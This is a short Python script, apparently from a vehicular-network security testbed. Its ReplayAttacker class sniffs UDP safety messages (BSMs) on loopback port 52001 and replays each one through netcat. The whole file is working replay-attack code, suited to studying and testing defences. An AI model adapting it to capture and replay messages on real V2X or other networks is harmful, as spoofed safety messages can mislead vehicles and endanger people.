from scapy.all import sniff
import binascii
import subprocess
import time


class ReplayAttacker:

    def __init__(self):
        self.storedBSMs = []

    def replay_attack(self, how_long_to_collect):
        self.collect(how_long_to_collect)
        self.replay()

    def collect(self, timeout):
        sniff(iface="lo", filter="dst port 52001", prn=lambda x: self.store_message(str(binascii.hexlify(x.load))),
              timeout=timeout)

    def store_message(self, message):
        # print(message)
        self.storedBSMs.append(message)

    def replay(self):
        for bsm in self.storedBSMs:
            # BSM = BSM.decode('utf-8')
            # BSM = b'\\x' + b'\\x'.join(BSM[i:i+2] for i in range(0, len(BSM), 2))
            bsm = bsm[2:len(bsm) - 2]
            bsm = "\\x" + "\\x".join(bsm[i:i + 2] for i in range(0, len(bsm), 2))
            # print("replay:\t" + BSM)
            print("Replaying BSM")
            loader = subprocess.Popen(("echo", "-n", "-e", bsm), stdout=subprocess.PIPE)
            sender = subprocess.check_output(("nc", "-w0", "-u", "localhost", "52001"), stdin=loader.stdout)
            # print("Replay sent!")
            time.sleep(0.1)
